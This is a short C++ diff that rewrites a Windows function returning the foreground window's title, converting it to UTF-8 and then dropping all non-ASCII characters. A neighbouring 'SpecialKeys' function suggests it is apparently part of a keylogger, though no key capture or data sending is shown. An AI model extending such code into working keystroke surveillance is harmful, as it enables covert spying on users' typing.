@@ -80,15 +80,37 @@ bool SpecialKeys(int S_Key)
 
 string GetActiveWindowTitle()
 {
-    char windowTitle[256];
-    // Corrected to use native HWND definition
+    wchar_t windowTitle[256];
     HWND hwnd = GetForegroundWindow();
+
     if (hwnd != NULL)
     {
-        int length = GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
+        // 1. Retrieve the window text as a native Wide (UTF-16) string
+        int length = GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));
         if (length > 0)
         {
-            return string(windowTitle);
+            // 2. Determine the buffer size needed for a clean conversion to UTF-8
+            int bufferSize = WideCharToMultiByte(CP_UTF8, 0, windowTitle, length, NULL, 0, NULL, NULL);
+            string resultStr(bufferSize, 0);
+
+            // 3. Perform the actual conversion to a standard string
+            WideCharToMultiByte(CP_UTF8, 0, windowTitle, length, &resultStr[0], bufferSize, NULL, NULL);
+
+            // 4. Sanitize the output string by removing any leftover non-ASCII symbols or raw '?'
+            string sanitizedStr = "";
+            for (char c : resultStr)
+            {
+                // Only retain readable ASCII characters (ignoring extended non-printable blocks or literal errors)
+                if (c >= 32 && c <= 126)
+                {
+                    sanitizedStr += c;
+                }
+            }
+
+            if (!sanitizedStr.empty())
+            {
+                return sanitizedStr;
+            }
         }
     }
     return "Unknown Window";
